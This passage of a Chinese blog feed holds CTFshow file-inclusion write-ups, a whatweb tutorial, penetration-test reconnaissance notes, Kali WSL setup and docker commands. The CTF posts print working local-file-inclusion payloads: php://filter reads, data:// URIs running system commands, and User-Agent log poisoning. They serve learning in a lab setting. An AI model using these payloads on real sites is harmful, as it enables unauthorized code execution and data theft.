exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow文件包含</title>
      <link href="/2022/08/04/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2022/08/04/CTFshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-题目分析："><a href="#一-题目分析：" class="headerlink" title="一.题目分析："></a>一.题目分析：</h2><p>简单的文件包含，没有任何过滤，直接使用伪协议读就行。</p><h2 id="二-解题思路："><a href="#二-解题思路：" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>playload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-题目分析：-1"><a href="#一-题目分析：-1" class="headerlink" title="一.题目分析："></a>一.题目分析：</h2><p>替换了php</p><h2 id="二-解题思路：-1"><a href="#二-解题思路：-1" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>构造playload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?= system(&quot;cat fla*&quot;);?&gt;</span><br><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><h1 id="web-80-81"><a href="#web-80-81" class="headerlink" title="web 80-81"></a>web 80-81</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="一-题目分析：-2"><a href="#一-题目分析：-2" class="headerlink" title="一.题目分析："></a>一.题目分析：</h2><p>过滤了php和data，用日志包含绕过，将执行的命令插入日志中<br> 这道题奇怪的是nginx日志在<code>/var/log/nginx/access.log</code>，一般apache日志在类似目录下<code>(/var/log/httpd/access.log)</code></p><p>日志地址通常为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/log/nginx/error.log</span><br><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><h2 id="二-解题思路：-2"><a href="#二-解题思路：-2" class="headerlink" title="二.解题思路："></a>二.解题思路：</h2><p>在User-Agent插入<br> <code>&lt;?php echo system(&#39;ls&#39;);?&gt;</code><br> 然后将日志包含进来</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-08-07173410.png"></p><p>直接cat即可得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>whatweb使用教程</title>
      <link href="/2022/07/30/whatweb%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2022/07/30/whatweb%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="常规扫描："><a href="#常规扫描：" class="headerlink" title="常规扫描："></a>常规扫描：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 域名</span><br></pre></td></tr></table></figure><h1 id="批量扫描："><a href="#批量扫描：" class="headerlink" title="批量扫描："></a>批量扫描：</h1><p>我们可以通过将很多要扫描的域名放在文件内，然后扫描时指定该文件即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -i /root/target.txt</span><br></pre></td></tr></table></figure><h1 id="详细回显扫描："><a href="#详细回显扫描：" class="headerlink" title="详细回显扫描："></a>详细回显扫描：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb -v 域名</span><br></pre></td></tr></table></figure><h1 id="强度扫描等级控制："><a href="#强度扫描等级控制：" class="headerlink" title="强度扫描等级控制："></a>强度扫描等级控制：</h1><p>whatweb有一个-aggression（简写为-a）参数，此参数后边可以跟数字1-4，分别对应4个不同的等级。</p><ol><li>stealthy 每个目标发送一次http请求，并且会跟随重定向</li><li>unused 不可用（从2011年开始，此参数就是在开发状态</li><li>aggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果确定的</li><li>heavy 每个目标会发送大量的http请求，会去尝试每一个插件</li></ol><p>whatweb -a 等级 域名 （可以和-v参数结合使用</p><h1 id="快速本地扫描（扫描内网主机）："><a href="#快速本地扫描（扫描内网主机）：" class="headerlink" title="快速本地扫描（扫描内网主机）："></a>快速本地扫描（扫描内网主机）：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb --no-errors -t 255 内网网段 （可以和-a和-v参数结合使用</span><br></pre></td></tr></table></figure><h1 id="将扫描结果导出至文件内："><a href="#将扫描结果导出至文件内：" class="headerlink" title="将扫描结果导出至文件内："></a>将扫描结果导出至文件内：</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://www.baidu.com --log-xml=baidu.xml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--log-brief=FILE            简单的记录，每个网站只记录一条返回信息</span><br><span class="line">--log-verbose=FILE            详细输出</span><br><span class="line">--log-xml=FILE            返回xml格式的日志</span><br><span class="line">--log-json=FILE            以json格式记录日志</span><br><span class="line">--log-json-verbose=FILE            记录详细的json日志</span><br><span class="line">--log-magictree=FILE            xml的树形结构</span><br><span class="line">--log-object=FILE            ruby对象格式</span><br><span class="line">--log-mongo-database            mongo数据库格式</span><br></pre></td></tr></table></figure><p>注：json格式需要安装json依赖sudo gem install json</p><p>Mongo格式需要安装mongo依赖sudo gem install json</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="/2022/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2022/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试之信息收集"><a href="#渗透测试之信息收集" class="headerlink" title="渗透测试之信息收集"></a>渗透测试之信息收集</h1><h2 id="一-收集域名信息"><a href="#一-收集域名信息" class="headerlink" title="一 .收集域名信息"></a>一 .收集域名信息</h2><h3 id="1-Whois查询"><a href="#1-Whois查询" class="headerlink" title="1.Whois查询"></a>1.Whois查询</h3><p>kali：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois 域名</span><br></pre></td></tr></table></figure><p>爱站工具网：<a href="http://whois.aizhan.com/">http://whois.aizhan.com</a></p><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com</a></p><p>VirusTotal： <a href="http://www.virustotal.com/">http://www.virustotal.com</a></p><h3 id="2-备案信息查询"><a href="#2-备案信息查询" class="headerlink" title="2.备案信息查询"></a>2.备案信息查询</h3><ul><li>ICP备案查询网：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></li><li>天眼查：<a href="http://www.tianyancha.com/">http://www.tianyancha.com</a></li></ul><h2 id="二-收集敏感信息"><a href="#二-收集敏感信息" class="headerlink" title="二.收集敏感信息"></a>二.收集敏感信息</h2><p>Google 语法：</p><table><thead><tr><th align="left">关键字</th><th align="left">说                       明</th></tr></thead><tbody><tr><td align="left">site</td><td align="left">指定域名</td></tr><tr><td align="left">inurl</td><td align="left">URL中存在关键字的网页</td></tr><tr><td align="left">intext</td><td align="left">网页正文中存在的关键字</td></tr><tr><td align="left">filetype</td><td align="left">指定文件类型</td></tr><tr><td align="left">intitle</td><td align="left">网页标题中的关键字</td></tr><tr><td align="left">link</td><td align="left">link:baidu.com即表示返回所有和baidu.com做了链接的URL</td></tr><tr><td align="left">info</td><td align="left">查找指定站点的一些基本信息</td></tr><tr><td align="left">cache</td><td align="left">搜索Google里关于某些内容的缓存</td></tr></tbody></table><p>也可以通过乌云漏洞列表查询历史漏洞信息：<a href="https://wy.zone.ci/bugs.php">https://wy.zone.ci/bugs.php</a></p><h2 id="三-收集子域名信息"><a href="#三-收集子域名信息" class="headerlink" title="三.收集子域名信息"></a>三.收集子域名信息</h2><h3 id="1-子域名检测工具"><a href="#1-子域名检测工具" class="headerlink" title="1.子域名检测工具"></a>1.子域名检测工具</h3><p>常见的工具：</p><p>Layer子域名挖掘机</p><p>subDomainsBrute</p><p>Sublist3r</p><h3 id="2-子域名查询网站"><a href="#2-子域名查询网站" class="headerlink" title="2.子域名查询网站"></a>2.子域名查询网站</h3><p><a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></p><p><a href="http://dns.aizhan.com/">http://dns.aizhan.com</a></p><h2 id="四-收集常用端口信息"><a href="#四-收集常用端口信息" class="headerlink" title="四.收集常用端口信息"></a>四.收集常用端口信息</h2><p>常见工具：nmap</p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/IMG_20249.jpg" style="zoom: 25%;" /><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/IMG_20220730_184627.jpg" style="zoom:25%;" /><h2 id="五-指纹识别"><a href="#五-指纹识别" class="headerlink" title="五.指纹识别"></a>五.指纹识别</h2><p>代表有御剑web指纹识别，WhatWeb, 等</p><p>在线网站：</p><p>BugScaner: <a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></p><h2 id="六-查找真实IP"><a href="#六-查找真实IP" class="headerlink" title="六.查找真实IP"></a>六.查找真实IP</h2><p>若目标服务器不存在CDN，可以直接通过 <a href="https://www.ip138.com/%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%9A%84IP%E5%9C%B0%E5%9D%80">https://www.ip138.com/获取目标的IP地址</a></p><p>若不确定存在CDN，可以采用在线网站17CE：<a href="http://www.17ce.com/">http://www.17ce.com</a> </p><p>若IP不一样则开启了CDN。</p><h3 id="绕过CDN寻找真实IP"><a href="#绕过CDN寻找真实IP" class="headerlink" title="绕过CDN寻找真实IP"></a>绕过CDN寻找真实IP</h3><p>国外访问：</p><p>全球PING ：<a href="https://www.nslookuptool.com/">https://www.nslookuptool.com/</a></p><h2 id="七-收集敏感目录文件"><a href="#七-收集敏感目录文件" class="headerlink" title="七.收集敏感目录文件"></a>七.收集敏感目录文件</h2><p>常见工具：</p><p>dirsearch</p><p>WebScan : <a href="http://www.webscan.cc/">http://www.webscan.cc</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kali子系统配置</title>
      <link href="/2022/07/27/kali%E5%AD%90%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/07/27/kali%E5%AD%90%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h2><ol><li>在设置中开启开发人员模式：设置-windows更新-开发者选项-打开开发人员模式</li><li>设置搜索并打开控制面板-程序-启用或关闭windows功能-勾选适用于linux的windows系统-确定</li></ol><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/屏幕截图2022-07-27172608.png" style="zoom:80%;" /><p>由于本机是专业版所以需要另外勾选Hyper-v</p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><ol><li>搜索或打开microsoft store(微软应用商店) 注：关闭自动更新后将不能使用，如需使用请开启检查更新</li><li>搜索kali linux下载</li><li>启动并设置密码</li></ol><h2 id="移动系统："><a href="#移动系统：" class="headerlink" title="移动系统："></a>移动系统：</h2><ol><li><p>使用LxRunOffline<br> <a href="https://www.riyueen.com/go?_=9cf1400f06aHR0cHM6Ly9naXRodWIuY29tL0REb1NvbGl0YXJ5L0x4UnVuT2ZmbGluZQ==">https://github.com/DDoSolitary/LxRunOffline</a></p><p>在releases 里面下载最新版，如不能下载可以评论会转到阿里网盘</p></li><li><p>cd 到解压目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd D:\lx</span><br></pre></td></tr></table></figure></li><li><p>显示已安装系统</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\LxRunOffline.exe list</span><br></pre></td></tr></table></figure></li><li><p>将系统迁移到D:\kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\LxRunOffline.exe move -n kali-linux -d D:\kali</span><br></pre></td></tr></table></figure></li><li><p>查看是否迁移成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\LxRunOffline.exe get-dir -n kali-linux</span><br></pre></td></tr></table></figure></li><li><p>关于LxRunOffline的更多使用方法可以看下面链接<br> <a href="https://www.riyueen.com/go?_=8253d08c41aHR0cHM6Ly9wM3RlcnguY29tL2FyY2hpdmVzL21hbmFnZS13c2wtd2l0aC1seHJ1bm9mZmxpbmUuaHRtbA==">https://p3terx.com/archives/manage-wsl-with-lxrunoffline.html</a></p></li></ol><p>注：若出现报错可以尝试以下版本：</p><p>下载链接：<a href="https://wwt.lanzouq.com/iTBbX08hvjbc">https://wwt.lanzouq.com/iTBbX08hvjbc</a></p><h2 id="以ROOT登录："><a href="#以ROOT登录：" class="headerlink" title="以ROOT登录："></a>以ROOT登录：</h2><p>右键win图标 以管理员运行windows终端 输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali config --default-user root</span><br></pre></td></tr></table></figure><p>重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net stop LxssManager</span><br><span class="line">net start LxssManager</span><br></pre></td></tr></table></figure><p>启动kali或命令行输入kali</p><p>修改密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd root</span><br></pre></td></tr></table></figure><h2 id="配置："><a href="#配置：" class="headerlink" title="配置："></a>配置：</h2><p>1.安装vim</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get install vim</span><br></pre></td></tr></table></figure><p>2.换源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>将原本的源地址注释，替换为以下源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#阿里云</span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line"> </span><br><span class="line">#清华大学</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"> </span><br><span class="line">#浙大</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="开启ssh"><a href="#开启ssh" class="headerlink" title="开启ssh"></a>开启ssh</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">修改 sshd 配置文件：</span><br><span class="line">vim /etc/ssh/sshd_config</span><br><span class="line">去掉允许授权登陆前的注释；加上 PermitRootLogin yes。</span><br><span class="line"> </span><br><span class="line">开机自启动：</span><br><span class="line">update-rc.d ssh enable</span><br></pre></td></tr></table></figure><h2 id="远程桌面："><a href="#远程桌面：" class="headerlink" title="远程桌面："></a>远程桌面：</h2><ol><li><p>下载桌面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install kali-desktop-xfce</span><br><span class="line">apt-get install xorg</span><br><span class="line">apt-get install xfce4</span><br><span class="line">apt-get install xrdp</span><br></pre></td></tr></table></figure></li><li><p>配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/xrdp/xrdp.ini</span><br></pre></td></tr></table></figure><p>将两处端口改为3390</p><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-27173450.png"></p></li><li><p>重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xrdp restart</span><br></pre></td></tr></table></figure></li><li><p>设置自启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update-rc.d xrdp enable</span><br></pre></td></tr></table></figure></li><li><p>连接</p><p>win+r打开运行 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc</span><br></pre></td></tr></table></figure><p> 回车</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:3390</span><br></pre></td></tr></table></figure><p>如不能进入 kali输入<code>ifconfig</code> 查看ip按这个ip进入</p></li></ol><h2 id="汉化："><a href="#汉化：" class="headerlink" title="汉化："></a>汉化：</h2><ol><li><p>导入win10字体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /usr/share/fonts/windows </span><br><span class="line">cp -r /mnt/c/Windows/Fonts/*.ttf /usr/share/fonts/windows/</span><br></pre></td></tr></table></figure></li><li><p>安装字体管理器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y fontconfig</span><br></pre></td></tr></table></figure></li><li><p>替换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LC_ALL=zh_CN.UTF8 and LANG=zh_CN.UTF8 and LANGUAGE=zh_CN.UTF8</span><br></pre></td></tr></table></figure></li><li><p>清理字体缓存<code>fc-cache </code></p></li></ol><h2 id="汉化桌面："><a href="#汉化桌面：" class="headerlink" title="汉化桌面："></a>汉化桌面：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">在文件中添加</span><br><span class="line">export LANG=zh_CN.UTF-8</span><br><span class="line">export LANGUAGE=zh_CN.UTF-8</span><br><span class="line">export LC_ALL=zh_CN.UTF-8</span><br></pre></td></tr></table></figure><p><img src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE2022-07-27173739.png"></p><p>重启xrdp服务</p><p>推荐文件夹使用英文目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service xrdp start</span><br></pre></td></tr></table></figure><h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a>安装中文输入法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install fcitx </span><br><span class="line">apt install fcitx-googlepinyin </span><br></pre></td></tr></table></figure><p>Linux使用ctrl+空格切换输入法</p><h2 id="汉化火狐"><a href="#汉化火狐" class="headerlink" title="汉化火狐"></a>汉化火狐</h2><p>1.右边三横-齿轮（preferences）</p><p><img src="https://z3.ax1x.com/2021/10/31/ISuTw8.png" alt="%title插图%num"></p><p>2.搜索language-&gt;set***-&gt;select alanguage to add..-&gt;选择chinese简体-&gt;ok即可</p><p>3.重启浏览器</p><h2 id="安装完整系统"><a href="#安装完整系统" class="headerlink" title="安装完整系统:"></a>安装完整系统:</h2><p>工具集约7G，完全体会占到40G左右</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update </span><br><span class="line">apt-get install kali-linux-full</span><br></pre></td></tr></table></figure><p>注意：新版本中<code>kali-linux-all</code>更名为<code>kali-linux-everything</code></p><p>由于以上原因，报错请执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install kali-linux-everything</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker 命令</title>
      <link href="/2022/07/24/docker-%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/07/24/docker-%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><ul><li>启动容器并启动bash（交互方式）:</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker run -i -t &lt;image_name/continar_id&gt; /bin/bash</span><br></pre></td></tr></table></figure><ul><li>启动容器以后台方式运行(更通用的方式）：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker run -d -it  image_name</span><br></pre></td></tr></table></figure><p>ps：这里的 image_name 包含了tag：hello.demo.kdemo:v1.0</p><h3 id="附着到容器"><a href="#附着到容器" class="headerlink" title="附着到容器"></a>附着到容器</h3><ul><li>附着到正在运行的容器</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach &lt;id、container_name&gt;</span><br></pre></td></tr></table></figure><ul><li>进入正在运行的容器内部，同时运行bash(比attach更好用)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -t -i &lt;id/container_name&gt;  /bin/bash</span><br></pre></td></tr></table></figure><p>ps：docker exec是如此的有用，以至于我们通常是将其封装为一个脚本，放到全局可调用的地方，比如，可以写成一个indocker.sh：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$cat indocker.sh </span><br><span class="line">docker exec -t -i $1 /bin/bash</span><br><span class="line"># 查看需要附着的容器id</span><br><span class="line">$docker ps | less -S</span><br><span class="line">CONTAINER ID        IMAGE                                                 </span><br><span class="line">9cf7b563f689        hello.demo.kdemo:v160525.202747</span><br><span class="line"></span><br><span class="line">$./indocker.sh 9cf7b563f689 </span><br></pre></td></tr></table></figure><h3 id="查看容器日志"><a href="#查看容器日志" class="headerlink" title="查看容器日志"></a>查看容器日志</h3><ul><li>查看容器日志</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;id/container_name&gt;</span><br></pre></td></tr></table></figure><ul><li>实时查看日志输出</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f &lt;id/container_name&gt; (类似 tail -f) (带上时间戳-t）</span><br></pre></td></tr></table></figure><h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><ul><li> 列出当前所有正在运行的container</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker ps</span><br></pre></td></tr></table></figure><ul><li>用一行列出所有正在运行的container（容器多的时候非常清晰）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker ps | less -S</span><br></pre></td></tr></table></figure><ul><li> 列出所有的container</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$docker ps -a  </span><br></pre></td></tr></table></figure><ul><li> 